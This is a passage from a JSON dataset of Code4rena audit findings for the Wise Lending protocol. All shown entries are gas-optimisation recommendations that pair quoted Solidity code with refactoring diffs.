`_newBaseURI` was not modified, we can reduce the gas cost of the `PositionNFTs.setBaseURI()` function by using `calldata` in place of `memory` in the definition of the `_newBaseURI` parameter. In implementing this we would avoid having to copy the string from calldata to memory. The diff below shows how the code should be refactored:\n\n```solidity\nfile: contracts/PositionNFTs.sol\n\n319:    function setBaseURI(\n320:        string memory _newBaseURI    //@audit use calldata in-place of memory\n321:    )\n322:        external\n323:        onlyMaster\n324:    {\n325:        baseURI = _newBaseURI;\n326:    }\n```\n\n```diff\ndiff --git a/contracts/PositionNFTs.sol b/contracts/PositionNFTs.sol\nindex fb680ec..b43253d 100644\n--- a/contracts/PositionNFTs.sol\n+++ b/contracts/PositionNFTs.sol\n@@ -317,7 +317,7 @@ contract PositionNFTs is ERC721Enumerable, OwnableMaster {\n      * @dev Allows to update base target for MetaData.\n      */\n     function setBaseURI(\n-        string memory _newBaseURI\n+        string calldata _newBaseURI\n     )\n         external\n         onlyMaster\n```\n\n**Instance 6:**\n\nRefactor the `PositionNFTs.setBaseExtension()` function to use `calldata` in place of `memory` for the `_newBaseExtension` parameter.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PositionNFTs.sol#L329\n\nSince the string parameter `_newBaseExtension` was not modified, we can reduce the gas cost of the `PositionNFTs.setBaseExtension()` function by using `calldata` in place of `memory` in the definition of the `_newBaseExtension` parameter. In implementing this we would avoid having to copy the string from calldata to memory. The diff below shows how the code should be refactored:\n\n```solidity\nfile: contracts/PositionNFTs.sol\n\n328:    function setBaseExtension(\n329:        string memory _newBaseExtension    //@audit use calldata in-place of memory\n330:    )\n331:        external\n332:        onlyMaster\n333:    {\n334:        baseExtension = _newBaseExtension;\n335:    }\n```\n\n```diff\ndiff --git a/contracts/PositionNFTs.sol b/contracts/PositionNFTs.sol\nindex fb680ec..ed078dd 100644\n--- a/contracts/PositionNFTs.sol\n+++ b/contracts/PositionNFTs.sol\n@@ -326,7 +326,7 @@ contract PositionNFTs is ERC721Enumerable, OwnableMaster {\n     }\n\n     function setBaseExtension(\n-        string memory _newBaseExtension\n+        string calldata _newBaseExtension\n     )\n         external\n         onlyMaster\n```\n\n**Instance 7:**\n\nRefactor the `PendlePowerFarmTokenFactory.deploy()` function to use `calldata` in place of `memory` for the `_tokenName` and `_symbolName` parameters.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol#L37-#L38\n\nSince the strings parameters `_tokenName` and `_symbolName` were not modified, we can reduce the gas cost of the `PendlePowerFarmTokenFactory.deploy()` function by using `calldata` in place of `memory` in the definition of these parameters. In implementing this we would avoid having to copy the strings from calldata to memory. The diff below shows how the code should be refactored:\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol\n\n35:    function deploy(\n36:        address _underlyingPendleMarket,\n37:        string memory _tokenName,     //@audit use calldata in-place of memory\n38:        string memory _symbolName,    //@audit use calldata in-place of memory\n39:        uint16 _maxCardinality\n40:    )\n41:        external\n42:        returns (address)\n43:    {\n44:        if (msg.sender != PENDLE_POWER_FARM_CONTROLLER) {\n45:            revert DeployForbidden();\n46:        }\n47:\n48:        return _clone(\n49:            _underlyingPendleMarket,\n50:            _tokenName,\n51:            _symbolName,\n52:            _maxCardinality\n53:        );\n54:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol\nindex 0936d72..836a38b 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol\n@@ -34,8 +34,8 @@ contract PendlePowerFarmTokenFactory {\n\n     function deploy(\n         address _underlyingPendleMarket,\n-        string memory _tokenName,\n-        string memory _symbolName,\n+        string calldata _tokenName,\n+        string calldata _symbolName,\n         uint16 _maxCardinality\n     )\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32123",
      "title": "[G-09]  Move lesser gas costing checks to the top",
      "impact": "GAS",
      "content": "\n`Revert()` statements that check input arguments or cost less gas than what should be at the top of the function. Checks that involve constants should come before checks that involve state variables, function calls and calculations. By doing these checks first, the function is able to revert before wasting a lot of gas in a function that may ultimately revert in the unhappy case.\n\nMove `if (_nftIdLiquidator == _nftId) {revert InvalidLiquidator()}` to the top of the function.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L258-#L276\n\nIn the `_checkLiquidatorNft()` function as shown below the if-revert statement `if (positionLocked[_nftIdLiquidator] == true) {revert LiquidatorIsInPowerFarm()}` is more gas consuming than the if-revert statement `if (_nftIdLiquidator == _nftId) {revert InvalidLiquidator()}` as the former reads from state which cost `2100` gas units. \n\nWe can make the `_checkLiquidatorNft()` function more gas efficient by moving the cheaper if-revert statement `if (_nftIdLiquidator == _nftId) {revert InvalidLiquidator()}` to the top of the function so that in scenarios where the cheaper revert statement fails the function would revert without having to read from state which is expensive. The diff below shows how the code should be refactored:\n\n```solidity\nfile: contracts/MainHelper.sol\n\n258:    function _checkLiquidatorNft(\n259:        uint256 _nftId,\n260:        uint256 _nftIdLiquidator\n261:    )\n262:        internal\n263:        view\n264:    {\n265:        if (positionLocked[_nftIdLiquidator] == true) {\n266:            revert LiquidatorIsInPowerFarm();\n267:        }\n268:\n269:        if (_nftIdLiquidator == _nftId) {\n270:            revert InvalidLiquidator();\n271:        }\n272:\n273:        if (_nftIdLiquidator >= POSITION_NFT.getNextExpectedId()) {\n274:            revert InvalidLiquidator();\n275:        }\n276:    }\n```\n\n```diff\ndiff --git a/contracts/MainHelper.sol b/contracts/MainHelper.sol\nindex 46854bc..d84e200 100644\n--- a/contracts/MainHelper.sol\n+++ b/contracts/MainHelper.sol\n@@ -262,14 +262,14 @@ abstract contract MainHelper is WiseLowLevelHelper {\n         internal\n         view\n     {\n-        if (positionLocked[_nftIdLiquidator] == true) {\n-            revert LiquidatorIsInPowerFarm();\n-        }\n-\n         if (_nftIdLiquidator == _nftId) {\n             revert InvalidLiquidator();\n         }\n\n+        if (positionLocked[_nftIdLiquidator] == true) {\n+            revert LiquidatorIsInPowerFarm();\n+        }\n+\n         if (_nftIdLiquidator >= POSITION_NFT.getNextExpectedId()) {\n             revert InvalidLiquidator();\n         }\n```\n\nEstimated gas saved: 2100 gas units.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32122",
      "title": "[G-08] State variables read in loop in `PendlePowerFarmToken._calculateRewardsClaimedOutside()` function should be avoided.",
      "impact": "GAS",
      "content": "\nIn the `PendlePowerFarmToken._calculateRewardsClaimedOutside()` function as shown below the state variables `PENDLE_MARKET` and `PENDLE_POWER_FARM_CONTROLLER` (`PENDLE_POWER_FARM_CONTROLLER` was read multiple times in the loop) were read in a loop. Doing it this way isn't efficient; rather we should cache these state variables before the loop then substitute the cached variables for the state variables in the loop implementing this would help avoid `SLOAD` Gwarmaccess (100 gas units) and replace them with cheaper stack reads. The diff below shows how the function should be refactored:\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L239\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L243\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L244\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L249\n\n<details>\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n\n218:    function _calculateRewardsClaimedOutside()\n219:        internal\n220:        returns (uint256[] memory)\n221:    {\n222:        address[] memory rewardTokens = PENDLE_CONTROLLER.pendleChildCompoundInfoRewardTokens(\n223:            UNDERLYING_PENDLE_MARKET\n224:        );\n225:\n226:        uint128[] memory lastIndex = PENDLE_CONTROLLER.pendleChildCompoundInfoLastIndex(\n227:            UNDERLYING_PENDLE_MARKET\n228:        );\n229:\n230:        uint256 l = rewardTokens.length;\n231:        uint256[] memory rewardsOutsideArray = new uint256[](l);\n232:\n233:        uint256 i;\n234:        uint128 index;\n235:\n236:        while (i < l) {\n237:            UserReward memory userReward = _getUserReward(\n238:                rewardTokens[i],\n239:                PENDLE_POWER_FARM_CONTROLLER    //@audit state variable read in loop\n240:            );\n241:\n242:            if (userReward.accrued > 0) {\n243:                PENDLE_MARKET.redeemRewards(        //@audit state variable read in loop\n244:                    PENDLE_POWER_FARM_CONTROLLER    //@audit state variable read in loop\n245:                );\n246:\n247:                userReward = _getUserReward(\n248:                    rewardTokens[i],\n249:                    PENDLE_POWER_FARM_CONTROLLER    //@audit state variable read in loop\n250:                );\n251:            }\n252:\n253:            index = userReward.index;\n254:\n255:            if (lastIndex[i] == 0 && index > 0) {\n256:                rewardsOutsideArray[i] = 0;\n257:                _overWriteIndex(\n258:                    i\n259:                );\n260:                unchecked {\n261:                    ++i;\n262:                }\n263:                continue;\n264:            }\n265:\n266:            if (index == lastIndex[i]) {\n267:                rewardsOutsideArray[i] = 0;\n268:                unchecked {\n269:                    ++i;\n270:                }\n271:                continue;\n272:            }\n273:\n274:            uint256 indexDiff = index\n275:                - lastIndex[i];\n276:\n277:            uint256 activeBalance = _getActiveBalance();\n278:            uint256 totalLpAssetsCurrent = totalLpAssets();\n279:            uint256 lpBalanceController = _getBalanceLpBalanceController();\n280:\n281:            bool scaleNecessary = totalLpAssetsCurrent < lpBalanceController;\n282:\n283:            rewardsOutsideArray[i] = scaleNecessary\n284:                ? indexDiff\n285:                    * activeBalance\n286:                    * totalLpAssetsCurrent\n287:                    / lpBalanceController\n288:                    / PRECISION_FACTOR_E18\n289:                : indexDiff\n290:                    * activeBalance\n291:                    / PRECISION_FACTOR_E18;\n292:\n293:            _overWriteIndex(\n294:                i\n295:            );\n296:\n297:            unchecked {\n298:                ++i;\n299:            }\n300:        }\n301:\n302:        return rewardsOutsideArray;\n303:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\nindex 9f7bb58..6cb42de 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n@@ -233,20 +233,22 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n         uint256 i;\n         uint128 index;\n\n+        IPendleMarket _PENDLE_MARKET = PENDLE_MARKET;\n+        address _PENDLE_POWER_FARM_CONTROLLER = PENDLE_POWER_FARM_CONTROLLER;\n         while (i < l) {\n             UserReward memory userReward = _getUserReward(\n                 rewardTokens[i],\n-                PENDLE_POWER_FARM_CONTROLLER\n+                _PENDLE_POWER_FARM_CONTROLLER\n             );\n\n             if (userReward.accrued > 0) {\n-                PENDLE_MARKET.redeemRewards(\n-                    PENDLE_POWER_FARM_CONTROLLER\n+                _PENDLE_MARKET.redeemRewards(\n+                    _PENDLE_POWER_FARM_CONTROLLER\n                 );\n\n                 userReward = _getUserReward(\n                     rewardTokens[i],\n-                    PENDLE_POWER_FARM_CONTROLLER\n+                    _PENDLE_POWER_FARM_CONTROLLER\n                 );\n             }\n```\n\n</details>\n\nEstimated gas saved: 388 gas units per iteration.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32121",
      "title": "[G-07] Unchecked Divisions",
      "impact": "GAS",
      "content": "\nDivisions which do not divide by `-X` cannot overflow or overflow so such operations can be unchecked to save gas.\n\n**Instance 1:**\n\nUnchecked uint divisions in `WiseSecurity.overallLendingAPY()` function to reduce its gas cost.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L491-#L492\n\n```solidity\nfile: contracts/WiseSecurity/WiseSecurity.sol\n\n442:    function overallLendingAPY(\n443:        uint256 _nftId\n444:    )\n445:        external\n446:        view\n447:        returns (uint256)\n448:    {\n449:        uint256 len = WISE_LENDING.getPositionLendingTokenLength(\n450:            _nftId\n451:        );\n.\n.\n.\n491:        return weightedRate     //@audit can be unchecked\n492:            / overallETH;\n493:    }\n```\n\n```diff\ndiff --git a/contracts/WiseSecurity/WiseSecurity.sol b/contracts/WiseSecurity/WiseSecurity.sol\nindex d2cfb24..a101048 100644\n--- a/contracts/WiseSecurity/WiseSecurity.sol\n+++ b/contracts/WiseSecurity/WiseSecurity.sol\n@@ -487,9 +487,11 @@ contract WiseSecurity is WiseSecurityHelper, ApprovalHelper {\n                 ++i;\n             }\n         }\n-\n-        return weightedRate\n+        unchecked {\n+            return weightedRate\n             / overallETH;\n+        }\n+\n     }\n```\n\nEstimated gas saved: 45 gas units.\n\n**Instance 2:**\n\nUnchecked uint divisions in `WiseSecurity.overallBorrowAPY()` function to reduce its gas cost.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L548-#L549\n\n```solidity\nfile: WiseSecurity/WiseSecurity.sol\n\n499:    function overallBorrowAPY(\n500:        uint256 _nftId\n501:    )\n502:        external\n503:        view\n504:        returns (uint256)\n505:    {\n506:        uint256 len = WISE_LENDING.getPositionBorrowTokenLength(\n507:            _nftId\n508:        );\n.\n.\n.\n548:        return weightedRate     // @audit can be unchecked\n549:            / overallETH;\n550:    }\n```\n\n```diff\ndiff --git a/contracts/WiseSecurity/WiseSecurity.sol b/contracts/WiseSecurity/WiseSecurity.sol\nindex d2cfb24..568e44c 100644\n--- a/contracts/WiseSecurity/WiseSecurity.sol\n+++ b/contracts/WiseSecurity/WiseSecurity.sol\n@@ -545,8 +545,10 @@ contract WiseSecurity is WiseSecurityHelper, ApprovalHelper {\n             }\n         }\n\n-        return weightedRate\n+        unchecked {\n+            return weightedRate\n             / overallETH;\n+        }\n     }\n```\n\nEstimated gas saved: 45 gas units.\n\n**Instance 3:**\n\nUnchecked uint divisions in `MainHelper._updatePseudoTotalAmounts()` function to reduce its gas cost.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L525-#L526\n\n```solidity\nfile: contracts/MainHelper.sol\n\n500:    function _updatePseudoTotalAmounts(\n501:        address _poolToken\n502:    )\n503:        private\n504:    {\n505:        uint256 currentTime = block.timestamp;\n.\n.\n.\n525:        uint256 amountInterest = bareIncrease   //@audit can be unchecked\n526:            / PRECISION_FACTOR_YEAR;\n527:\n528:        uint256 feeAmount = amountInterest\n529:            * globalPoolData[_poolToken].poolFee\n530:            / PRECISION_FACTOR_E18;\n.\n.\n.\n577:    }\n```\n\n```diff\ndiff --git a/contracts/MainHelper.sol b/contracts/MainHelper.sol\nindex 46854bc..de070c3 100644\n--- a/contracts/MainHelper.sol\n+++ b/contracts/MainHelper.sol\n@@ -521,9 +521,11 @@ abstract contract MainHelper is WiseLowLevelHelper {\n         }\n\n         delete bufferIncrease[_poolToken];\n-\n-        uint256 amountInterest = bareIncrease\n-            / PRECISION_FACTOR_YEAR;\n+        uint256 amountInterest;\n+        unchecked {\n+            amountInterest = bareIncrease / PRECISION_FACTOR_YEAR;\n+        }\n+\n```\n\nEstimated gas saved: 45 gas units.\n\n**Instance 4:**\n\nUnchecked uint divisions in `MainHelper._updatePseudoTotalAmounts()` function to reduce its gas cost.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L403-#L404\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n\n386:    function previewDistribution()\n387:        public\n388:        view\n389:        returns (uint256)\n390:    {\n391:        if (totalLpAssetsToDistribute == 0) {\n392:            return 0;\n393:        }\n394:\n395:        if (block.timestamp == lastInteraction) {\n396:            return 0;\n397:        }\n398:\n399:        if (totalLpAssetsToDistribute < ONE_WEEK) {\n400:            return totalLpAssetsToDistribute;\n401:        }\n402:\n403:        uint256 currentRate = totalLpAssetsToDistribute     // @audit can be unchecked\n404:            / ONE_WEEK;\n405:\n406:        uint256 additonalAssets = currentRate\n407:            * (block.timestamp - lastInteraction);\n408:\n409:        if (additonalAssets > totalLpAssetsToDistribute) {\n410:            return totalLpAssetsToDistribute;\n411:        }\n412:\n413:        return additonalAssets;\n414:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\nindex 9f7bb58..c39ed9c 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n@@ -400,8 +400,11 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n             return totalLpAssetsToDistribute;\n         }\n\n-        uint256 currentRate = totalLpAssetsToDistribute\n-            / ONE_WEEK;\n+        uint256 currentRate;\n+        unchecked {\n+            currentRate = totalLpAssetsToDistribute / ONE_WEEK;\n+        }\n+\n\n         uint256 additonalAssets = currentRate\n             * (block.timestamp - lastInteraction);\n```\n\nEstimated gas saved: 45 gas units.\n\n**Instance 5:**\n\nUnchecked uint divisions in `AaveHelper._underlyingAsset()` function to reduce its gas cost.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L322-#L323\n\n```solidity\nfile: contracts/WrapperHub/AaveHelper.sol\n\n315:    function getAavePoolAPY(\n316:        address _underlyingAsset\n317:    )\n318:        public\n319:        view\n320:        returns (uint256)\n321:    {\n322:        return AAVE.getReserveData(_underlyingAsset).currentLiquidityRate   //@audit can be unchecked\n323:            / PRECISION_FACTOR_E9;\n324    }\n```\n\n```diff\ndiff --git a/contracts/WrapperHub/AaveHelper.sol b/contracts/WrapperHub/AaveHelper.sol\nindex eca55d1..a4633bc 100644\n--- a/contracts/WrapperHub/AaveHelper.sol\n+++ b/contracts/WrapperHub/AaveHelper.sol\n@@ -319,7 +319,9 @@ abstract contract AaveHelper is Declarations {\n         view\n         returns (uint256)\n     {\n-        return AAVE.getReserveData(_underlyingAsset).currentLiquidityRate\n+        unchecked {\n+            return AAVE.getReserveData(_underlyingAsset).currentLiquidityRate\n             / PRECISION_FACTOR_E9;\n+        }\n     }\n }\n```\n\nEstimated gas saved: 45 gas units.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32120",
      "title": "[G-06]  Using `storage` instead of `memory` for struct saves gas",
      "impact": "GAS",
      "content": "\n**Instance 1:**\n\nMake `borrowData` a storage variable\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L1099\n\nWe could make the `_increaseResonanceFactor()` function more gas efficient if we declare the `borrowData` struct variable as `storage` rather than `memory`. In implementing this we would avoid having to copy all the members of `BorrowRatesEntry` struct from storage to memory which would incur a Gcoldsload (2100 gas) for each storage slot read which totals to 10500 gas units. Declaring the `borrowData` struct variable as a `storage` variable would only cost 100 gas units (Gwarmsload) which totals to 300 gas for the members read in the function (`deltaPole`, `pole` and `maxPole`) and members read more than once in the function are cached in stack variable and the stack variable used subsequently. The diff below shows how the code should be refactored: \n\n```solidity\nfile: contracts/MainHelper.sol\n\n1094:    function _increaseResonanceFactor(\n1095:        address _poolToken\n1096:    )\n1097:        private\n1098:    {\n1099:        BorrowRatesEntry memory borrowData = borrowRatesData[\n1100:            _poolToken\n1101:        ];\n1102:\n1103:        uint256 delta = borrowData.deltaPole\n1104:            * (block.timestamp - timestampsPoolData[_poolToken].timeStampScaling);\n1105:\n1106:        uint256 sum = delta\n1107:            + borrowData.pole;\n1108:\n1109:        uint256 setValue = sum > borrowData.maxPole\n1110:            ? borrowData.maxPole\n1111:            : sum;\n1112:\n1113:        _setPole(\n1114:            _poolToken,\n1115:            setValue\n1116:        );\n1117:    }\n```\n\n```diff\ndiff --git a/contracts/MainHelper.sol b/contracts/MainHelper.sol\nindex 46854bc..a1b4d0f 100644\n--- a/contracts/MainHelper.sol\n+++ b/contracts/MainHelper.sol\n@@ -1096,7 +1096,7 @@ abstract contract MainHelper is WiseLowLevelHelper {\n     )\n         private\n     {\n-        BorrowRatesEntry memory borrowData = borrowRatesData[\n+        BorrowRatesEntry storage borrowData = borrowRatesData[\n             _poolToken\n         ];\n\n@@ -1106,8 +1106,9 @@ abstract contract MainHelper is WiseLowLevelHelper {\n         uint256 sum = delta\n             + borrowData.pole;\n\n-        uint256 setValue = sum > borrowData.maxPole\n-            ? borrowData.maxPole\n+        unit256 _maxPole = borrowData.maxPole;\n+        uint256 setValue = sum > _maxPole\n+            ? _maxPole\n             : sum;\n```\n\nEstimated gas saved: 10200 gas units.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32119",
      "title": "[G-05] Redundant state variable getters",
      "impact": "GAS",
      "content": "\nGetters for public state variables are automatically generated by the solidity compiler so there is no need to code them manually as this increases deployment cost.\n\n**Instance 1:**\n\nMake `positionLendTokenData` mapping variable `private` or `internal` since a getter function was defined for it.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLendingDeclaration.sol#L270\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLowLevelHelper.sol#L144-#L153\n\nThe solidity compiler would automatically create a getter function for the `positionLendTokenData` mapping since it is declared as a `public` variable but a getter function `getPositionLendingTokenByIndex()` was also declared in the `WiseLowLevelHelper` contract for the same variable; thereby, making it two getter functions for the same variable in the contract. We could rectify this issue by making the `positionLendTokenData` variable private or internal (if the variable is to be inherited). The diff below shows how the code could be refactored:\n\n```solidity\nfile: contracts/WiseLendingDeclaration.sol\n\n270:    mapping(uint256 => address[]) public positionLendTokenData;\n\nfile: contracts/WiseLowLevelHelper.sol\n\n144:    function getPositionLendingTokenByIndex(\n145:        uint256 _nftId,\n146:        uint256 _index\n147:    )\n148:        public\n149:        view\n150:        returns (address)\n151:    {\n152:        return positionLendTokenData[_nftId][_index];\n153:    }\n```\n\n```diff\ndiff --git a/contracts/WiseLendingDeclaration.sol b/contracts/WiseLendingDeclaration.sol\nindex 05a0e01..d1ba624 100644\n--- a/contracts/WiseLendingDeclaration.sol\n+++ b/contracts/WiseLendingDeclaration.sol\n@@ -267,7 +267,7 @@ contract WiseLendingDeclaration is\n     mapping(address => uint256) internal bufferIncrease;\n     mapping(address => uint256) public maxDepositValueToken;\n\n-    mapping(uint256 => address[]) public positionLendTokenData;\n+    mapping(uint256 => address[]) internal positionLendTokenData;\n     mapping(uint256 => address[]) public positionBorrowTokenData;\n\n     mapping(uint256 => mapping(address => uint256)) public userBorrowShares;\n```\n\n**Instance 2:**\n\nMake `poolTokenAddresses` array variable `private` or `internal` since a getter function was defined for it.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/DeclarationsFeeManager.sol#L123\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L884-#L892\n\nThe solidity compiler would automatically create a getter function for the `poolTokenAddresses` array since it is declared as a `public` variable but a getter function `getPoolTokenAdressesByIndex()` was also declared in the `FeeManager` contract for the same variable thereby making it two getter functions for the same variable in the contract. We could rectify this issue by making the `poolTokenAddresses` variable private or internal (if the variable is to be inherited). The diff below shows how the code could be refactored:\n\n```solidity\nfile: contracts/FeeManager/DeclarationsFeeManager.sol\n\n123:    address[] public poolTokenAddresses;\n\nfile: contracts/FeeManager/FeeManager.sol\n\n884:    function getPoolTokenAdressesByIndex(\n885:        uint256 _index\n886:    )\n887:        external\n888:        view\n889:        returns (address)\n890:    {\n891:        return poolTokenAddresses[_index];\n892:    }\n```\n\n```diff\ndiff --git a/contracts/FeeManager/DeclarationsFeeManager.sol b/contracts/FeeManager/DeclarationsFeeManager.sol\nindex ba7eed7..e10f9be 100644\n--- a/contracts/FeeManager/DeclarationsFeeManager.sol\n+++ b/contracts/FeeManager/DeclarationsFeeManager.sol\n@@ -120,7 +120,7 @@ contract DeclarationsFeeManager is FeeManagerEvents, OwnableMaster {\n     uint256 public paybackIncentive;\n\n     // Array of pool tokens in wiseLending\n-    address[] public poolTokenAddresses;\n+    address[] internal poolTokenAddresses;\n\n     // Address of incentive master\n     address public incentiveMaster;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32118",
      "title": "[G-04] Unnecessary copy of storage struct to memory in the `OracleHelper` contract",
      "impact": "GAS",
      "content": "\nThe `OracleHelper` contract has multiple instances where a complete struct is being copied to memory to end up using only one of its attributes. The contract should be refactored such that only the required attribute is read from storage and cached into stack variable.\n\n**Instance 1:**\n\nRefactor `OracleHelper._addAggregator()` function to avoid copying the storage struct `uniTwapPoolInfo[  _tokenAddress]` into memory struct variable `uniTwapPoolInfoStruct`.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/OracleHelper.sol#L49-#L51\n\nWe could save up to 2.1k gas units if we read the `Oracle` attribute of the storage struct `uniTwapPoolInfo[  _tokenAddress]` directly rather than having to copy the storage struct in to a memory struct variable before accessing the member.\n\n```solidity\nfile: contracts/WiseOracleHub/OracleHelper.sol\n\n32:    function _addAggregator(\n33:        address _tokenAddress\n34:    )\n35:        internal\n36:    {\n37:        IAggregator tokenAggregator = IAggregator(\n38:            priceFeed[_tokenAddress].aggregator()\n39:        );\n40:\n41:        if (tokenAggregatorFromTokenAddress[_tokenAddress] > ZERO_AGGREGATOR) {\n42:            revert AggregatorAlreadySet();\n43:        }\n44:\n45:        if (_checkFunctionExistence(address(tokenAggregator)) == false) {\n46:            revert FunctionDoesntExist();\n47:        }\n48:\n49:        UniTwapPoolInfo memory uniTwapPoolInfoStruct = uniTwapPoolInfo[  \n50:            _tokenAddress\n51:        ];\n52:\n53:        if (uniTwapPoolInfoStruct.oracle > ZERO_ADDRESS) {\n54:            revert AggregatorNotNecessary();\n55:        }\n56:\n57:        tokenAggregatorFromTokenAddress[_tokenAddress] = tokenAggregator;\n58:    }\n```\n\n```diff\ndiff --git a/contracts/WiseOracleHub/OracleHelper.sol b/contracts/WiseOracleHub/OracleHelper.sol  \nindex 687b6f1..d3fb824 100644                                                                     \n--- a/contracts/WiseOracleHub/OracleHelper.sol                                                    \n+++ b/contracts/WiseOracleHub/OracleHelper.sol                                                    \n@@ -46,11 +46,7 @@ abstract contract OracleHelper is Declarations {                               \n             revert FunctionDoesntExist();                                                        \n         }                                                                                        \n\n-        UniTwapPoolInfo memory uniTwapPoolInfoStruct = uniTwapPoolInfo[                          \n-            _tokenAddress                                                                        \n-        ];                                                                                       \n-                                                                                                 \n-        if (uniTwapPoolInfoStruct.oracle > ZERO_ADDRESS) {                                       \n+        if (uniTwapPoolInfo[_tokenAddress].oracle > ZERO_ADDRESS) {                              \n             revert AggregatorNotNecessary();                                                     \n         }                                                                                        \n```\n\nEstimated gas saved: 2100 gas units.\n\n**Instance 2:**\n\nRefactor `OracleHelper._validateAnswer()` function to avoid copying the storage struct `uniTwapPoolInfo[  _tokenAddress]` into memory struct variable `uniTwapPoolInfoStruct`.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/OracleHelper.sol#L138-#L140\n\nWe could save up to 2.1k gas units if we read the `oracle` attribute of the storage struct `uniTwapPoolInfo[  _tokenAddress]` directly rather than having to copy the storage struct in to a memory struct variable before accessing the member.\n\n```solidity\nfile: contracts/WiseOracleHub/OracleHelper.sol\n\n131:    function _validateAnswer(\n132:        address _tokenAddress\n133:    )\n134:        internal\n135:        view\n136:        returns (uint256)\n137:    {\n138:        UniTwapPoolInfo memory uniTwapPoolInfoStruct = uniTwapPoolInfo[\n139:            _tokenAddress\n140:        ];\n141:\n142:        uint256 fetchTwapValue;\n143:\n144:        if (uniTwapPoolInfoStruct.oracle > ZERO_ADDRESS) {\n145:            fetchTwapValue = latestResolverTwap(\n146:                _tokenAddress\n147:            );\n148:        }\n.\n.\n.\n174:    }\n```\n```diff\ndiff --git a/contracts/WiseOracleHub/OracleHelper.sol b/contracts/WiseOracleHub/OracleHelper.sol\nindex 687b6f1..9200896 